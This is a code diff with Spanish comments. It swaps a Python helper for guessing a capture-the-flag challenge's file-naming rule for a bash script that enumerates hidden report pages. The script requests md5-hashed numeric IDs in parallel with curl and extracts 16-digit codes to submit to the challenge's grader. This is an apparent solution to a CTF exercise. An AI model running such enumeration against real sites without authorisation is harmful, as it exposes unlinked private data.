@@ -29,124 +29,48 @@ done < numeros.txt | grep -v 404
 
 
 
+#!/usr/bin/env bash
+# probe_ids.sh - la regla es:  /codes/ md5(<id entero>) /
+# Confirmada con: md5("9912")=archivo A, md5("9995")=archivo B.
+# Busca reportes NO linkeados; el de "apagar la IA" tiene un codigo de 16 digitos.
+#
+# Uso:
+#   bash probe_ids.sh            # rango 9900..10050 (zona caliente, rapido)
+#   bash probe_ids.sh 0 99999    # barrido amplio
+#
+# OJO: md5 del id SIN salto de linea -> printf '%s' (nunca 'echo', que mete \n).
+set -u
+BASE="https://chl-61f36451-dce1-47e2-8c43-7a8abcfe83f4-apagar-ia.softwareseguro.com.ar/codes"
+START=${1:-9900}
+END=${2:-10050}
 
-#!/usr/bin/env python3
-"""
-reverse_rule.py - descubrir la regla de nombres del reto "Apagar la IA".
+# --- sanity: el id 9912 (archivo A) DEBE existir. Si no, arreglá red/BASE. ---
+h=$(printf '%s' 9912 | md5sum | cut -d' ' -f1)
+sc=$(curl -s -o /dev/null -w '%{http_code}' -L "$BASE/$h/")
+echo "[sanity] id=9912 -> HTTP $sc (esperado 200)   hash=$h"
+if [ "$sc" != "200" ]; then
+  echo "  !! El sanity no dio 200. No confies en el loop hasta arreglarlo."
+fi
+echo "[*] barriendo ids $START..$END"
 
-Idea central: en vez de adivinar el 3er archivo a ciegas, REPRODUCI los dos
-que ya conoces. Si existe f tal que:
+probe() {
+  local i="$1" base="$2"
+  local h; h=$(printf '%s' "$i" | md5sum | cut -d' ' -f1)
+  local tmp; tmp=$(mktemp)
+  local code; code=$(curl -s -o "$tmp" -w '%{http_code}' -L "$base/$h/")
+  if [ "$code" != "404" ]; then
+    # extrae un posible codigo de 16 digitos del HTML
+    local hit; hit=$(grep -oE '[0-9]{16}' "$tmp" | head -1)
+    if [ -n "$hit" ]; then
+      echo ">>> id=$i HTTP $code  *** CODIGO16=$hit ***  $base/$h/"
+      echo "    md5($hit) = $(printf '%s' "$hit" | md5sum | cut -d' ' -f1)   <- esto al juez"
+    else
+      echo ">>> id=$i HTTP $code  (reporte, sin codigo 16)  $base/$h/"
+    fi
+  fi
+  rm -f "$tmp"
+}
+export -f probe
 
-    md5(f(datos_A)) == HASH_A   Y   md5(f(datos_B)) == HASH_B
-
-entonces conoces la regla y el 3ro sale aplicando la misma f.
-Si NINGUNA transformacion imprime [MATCH], es prueba de que el nombre NO
-se deriva de los numeros -> el camino es headers/contenido/hint, no aritmetica.
-"""
-import hashlib
-
-# ============== PEGA TUS DATOS REALES ACA ==============
-HASH_A = "0e1422xxxxxxxxxxxxxxxxxxxxxxxxxxc4"   # nombre COMPLETO del archivo A (32 hex)
-HASH_B = "0602940fxxxxxxxxxxxxxxxxxxxxxxxb0f"   # nombre COMPLETO del archivo B (32 hex)
-
-# Los numeros de cada archivo, como strings, EN EL ORDEN en que aparecen.
-NUMS_A = [
-    # "12345678", "123456789", ...
-]
-NUMS_B = [
-    # "87654321", "987654321", ...
-]
-
-# Opcional: contenido crudo si lo guardaste con  curl -s ... > a.html
-# RAW_A = open("a.html", "rb").read()
-RAW_A = None
-RAW_B = None
-# =======================================================
-
-
-def md5(x):
-    if isinstance(x, str):
-        x = x.encode()
-    return hashlib.md5(x).hexdigest()
-
-
-KNOWN = {HASH_A.lower(): "A", HASH_B.lower(): "B"}
-_hits = []
-
-
-def check(label, value):
-    if md5(value) in KNOWN:
-        who = KNOWN[md5(value)]
-        print(f"  [MATCH {who}]  regla = {label}")
-        print(f"              input = {value!r}")
-        _hits.append((who, label))
-
-
-def probar_archivo(nums, raw, tag):
-    if not nums:
-        return
-    # --- el nombre podria ser md5 del archivo entero ---
-    variantes = {
-        "join_asis":        "".join(nums),
-        "join_nl":          "\n".join(nums),
-        "join_nl_trailing": "\n".join(nums) + "\n",
-        "join_coma":        ",".join(nums),
-        "join_espacio":     " ".join(nums),
-        "join_ordenado":    "".join(sorted(nums)),
-        "join_ordenado_num":"".join(sorted(nums, key=int)),
-    }
-    for name, v in variantes.items():
-        check(f"md5({name} del archivo {tag})", v)
-
-    # --- o md5 de un valor resumen del archivo ---
-    check(f"md5(primer numero de {tag})", nums[0])
-    check(f"md5(ultimo numero de {tag})", nums[-1])
-    check(f"md5(suma de {tag})", str(sum(int(n) for n in nums)))
-
-    # --- o md5 de UN numero suelto (crudo y con \n) ---
-    for n in nums:
-        check(f"md5(numero suelto en {tag})", n)
-        check(f"md5(numero+\\n en {tag})", n + "\n")
-
-    # --- content-addressed: md5 del HTML crudo ---
-    if raw is not None:
-        check(f"md5(html crudo de {tag})", raw)
-
-
-def probar_ordinales():
-    # nombre = md5("1"), md5("report1"), etc.
-    for i in range(0, 8):
-        for pat in (str(i), f"report{i}", f"reporte{i}",
-                    f"code{i}", f"codes{i}", f"report_{i}"):
-            check(f"md5(ordinal '{pat}')", pat)
-
-
-def probar_pares_8digitos():
-    # 16 digitos = dos numeros de 8 concatenados -> md5 del 16-digitos = 3er archivo?
-    ochos = [n for n in (NUMS_A + NUMS_B) if len(n) == 8]
-    for a in ochos:
-        for b in ochos:
-            check("md5(par 8+8)", a + b)
-    # tambien contra los hashes conocidos por si uno de ellos es un 16-dig
-    # (ya cubierto por check); si querias probar el 3ro, genera las URLs:
-    if ochos:
-        print(f"\n  ({len(ochos)} numeros de 8 digitos -> "
-              f"{len(ochos)**2} candidatos de 16 digitos para probar en el server)")
-
-
-if __name__ == "__main__":
-    print("Probando transformaciones contra los hashes conocidos...\n")
-    probar_archivo(NUMS_A, RAW_A, "A")
-    probar_archivo(NUMS_B, RAW_B, "B")
-    probar_ordinales()
-    probar_pares_8digitos()
-
-    print()
-    if _hits:
-        print(f"[OK] Regla(s) encontrada(s): {_hits}")
-        print("     Aplica la MISMA transformacion al 3er conjunto para generar su URL.")
-    else:
-        print("[X] Ningun MATCH. El nombre NO sale de los numeros por md5.")
-        print("    => Deja de combinar numeros. Mira headers (ETag) y el HTML crudo:")
-        print("       curl -sIL  .../codes/<hashA>/   | grep -i etag")
-        print("       curl -sL   .../codes/<hashA>/   | cat -A")
+seq "$START" "$END" | xargs -P 20 -I{} bash -c 'probe "$@"' _ {} "$BASE"
+echo "[fin]"
